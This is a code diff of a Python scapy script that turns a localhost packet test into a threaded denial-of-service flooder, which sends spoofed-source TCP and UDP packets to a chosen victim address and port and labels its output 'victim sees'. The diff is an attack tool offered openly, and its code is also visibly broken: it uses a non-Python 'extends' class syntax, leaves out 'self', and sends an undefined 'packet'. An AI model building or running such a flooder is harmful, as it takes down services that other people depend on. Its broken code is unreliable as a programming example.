@@ -1,16 +1,21 @@
 from scapy.all import *
 from threading import Thread
 
-def sendPackets(subnetMin,subnetMax):
-	for i in range(subnetMin,subnetMax):
-		for j in range(1,255):
-			packet = IP(dst="127.0.0.1",src="10.0." + str(i) + "." + str(j),ttl=25)/TCP()/UDP()
-			send(packet)
-			print("victim sees 10.0." + str(i) + "." + str(j))
+class ddos extends threading.Thread:
 
-for i in range(1,32):
-	range = 8
-	rangeMin = i*8 - 7
-	rangeMax = i*8
-	thread = Thread(target=sendPackets,args=(rangeMin,rangeMax))
-	thread.start()
+
+	def sendPackets(subnetMin,subnetMax,victimAddress,victimPort):
+		for i in range(subnetMin,subnetMax):
+			for j in range(1,255):
+				packetTCP = IP(dst=victimAddress,src="10.0." + str(i) + "." + str(j),ttl=25)/TCP(dport=victimPort, flags=0x00)
+				packetUDP = IP(dst=victimAddress,src="10.0." + str(i) + "." + str(j),ttl=25)/UDP(dport=victimPort)
+				send(packet)
+				print("victim sees 10.0." + str(i) + "." + str(j))
+
+	def startDDOS(victimAddress,victimPort,numThreads):
+		for i in range(1,numThreads):
+			threadRange = 256/numThreads
+			rangeMin = i*threadRange - (threadRange-1)
+			rangeMax = i*threadRange
+			thread = Thread(target=sendPackets,args=(rangeMin,rangeMax,victimAddress,victimPort))
+			thread.start()
